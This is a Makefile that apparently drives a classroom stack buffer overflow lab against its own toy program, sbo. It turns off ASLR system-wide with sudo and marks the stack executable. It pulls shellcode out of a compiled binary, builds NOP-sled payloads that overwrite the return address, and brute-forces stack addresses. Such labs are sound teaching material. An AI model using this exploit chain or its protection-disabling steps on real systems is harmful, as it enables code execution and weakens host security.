###############################################################################

SHELL = /bin/bash

SRC = $(wildcard *.s *.c *.cc)
EXE = $(basename $(SRC))
ATT = $(EXE:=.att)
EXTRA = buffer.gdb buffer.txt buffer2.txt shellcode.txt

###############################################################################

CFLAGS = -m32 -g -fno-stack-protector -ggdb -Os -z execstack -Wall
CXXFLAGS = $(CFLAGS)
ASFLAGS = -m32

###############################################################################

default: $(EXE) $(ATT)

all: auto

aslrdemo: aslron rsp0 aslroff rsp2

aslroff:
	@echo -n "randomize_va_space: $$(cat /proc/sys/kernel/randomize_va_space) --> "
	@sudo sh -c "echo 0 > /proc/sys/kernel/randomize_va_space"
	@echo $$(cat /proc/sys/kernel/randomize_va_space)

aslron:
	@echo -n "randomize_va_space: $$(cat /proc/sys/kernel/randomize_va_space) --> "
	@sudo sh -c "echo 2 > /proc/sys/kernel/randomize_va_space"
	@echo $$(cat /proc/sys/kernel/randomize_va_space)

auto: shellcode.txt buffer2.txt
	@shellcode="$$(cat shellcode.txt)"; \
	padding="$$(for i in {1..35}; do echo -n '\x90'; done)"; \
	buffer="\x$$(cat buffer2.txt | fold -w2 | tac | paste -s | sed 's/\t/\\x/g')"; \
	payload="$$shellcode$$padding$$buffer"; \
	echo payload length = $$(( $${#payload} / 4 )); \
	echo ./sbo \"\$$\(echo -en \'$$payload\'\)\"; \
	./sbo "$$(echo -en $$payload)"

buffer.gdb: Makefile
	echo -e 'file sbo\nb main\nr\np &buffer\nq' > ./$@

buffer.txt: buffer.gdb pre
	@echo "$$(gdb -q -x ./buffer.gdb | grep '\$$1' | cut -d ' ' -f 5 | sed 's/..//' | paste -s | sed 's/\t//g')" > $@

buffer2.txt: buffer.txt
	printf '%x\n' $$(( 0x$$(cat ./$<) + 0x70 )) > ./$@

clean:
	rm -rf $(ATT) $(EXE) $(EXTRA) callgrind.out.* core.* *~

nxoff: sbo
	execstack -s ./$<

pre: aslroff sbo nxoff ulimit

rsp0: rsp
	@for i in {1..5}; do ./$<; done

rsp2: rsp
	@for i in {1..5}; do ./$<; done

shellcode.txt: shellcode buffer.gdb
	@start=0x$$(nm shellcode | grep [[:space:]]main | cut -d " " -f 1); \
	stop=0x$$(nm shellcode | grep [[:space:]]exit | cut -d " " -f 1); \
	shellcode=$$(objdump -d --start-address=$$start --stop-address=$$stop ./shellcode | cut -f 2 | grep -v ':' | sed '/^$$/d' | tr -d '[[:space:]]' | sed 's/\(..\)/\\x\1/g'); \
	echo $$shellcode > ./$@

ulimit:
	ulimit -c unlimited

val: sbo
	valgrind --demangle=yes --dump-instr=yes --tool=callgrind --trace-jump=yes ./$< xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx;
	kcachegrind $(ls -1t callgrind.out.* | tail -1) &

bof: sbo aslroff
	@buffer=$$(echo "$$(gdb -q -x inst.gdb | grep char | cut -d ' ' -f 5)"); \
	payload="$$(python run.py $$buffer)"; \
	./sbo "$$(echo -e "$$payload")"
		


z: shellcode sbo
	@shellcode=$$(cat shellcode.txt); \
	padding="$$(for i in {1..35}; do echo -n '\x90'; done)"; \
	buffer='\x10\xdf\xff\xff\xff\x7f'; \
	payload="$$shellcode$$padding$$buffer"; \
	echo payload length = $$(( $${#payload} / 4 )); \
	echo ./sbo \"\$$\(echo -en \'$$payload\'\)\"; \
	./sbo "$$(echo -en $$payload)"

zz: shellcode sbo
	@shellcode=$$(cat shellcode.txt); \
	padding="$$(for i in {1..35}; do echo -n '\x90'; done)"; \
	for i in d{c..f}; do \
		for j in {0..9}0 {a..f}0; do \
			buffer="\x$$j\x$$i\xff\xff\xff\x7f"; \
			echo $$buffer; \
			payload="$$shellcode$$padding$$buffer"; \
			#echo payload length = $$(( $${#payload} / 4 )); \
			#echo ./sbo \"\$$\(echo -en \'$$payload\'\)\"; \
			./sbo "$$(echo -en $$payload)"; \
		done; \
	done

###############################################################################

rsp: CFLAGS+=-O3

c-shellcode: CFLAGS= -m32 -ggdb -Os -static

%.att: %
	objdump -C -D ./$< > ./$@

###############################################################################

.PHONY: all aslrdemo aslroff aslron auto buffer.gdb buffer.txt buffer2.txt clean default nxoff pre rsp0 rsp2 ulimit val z zz

###############################################################################

.NOEXPORT:

###############################################################################
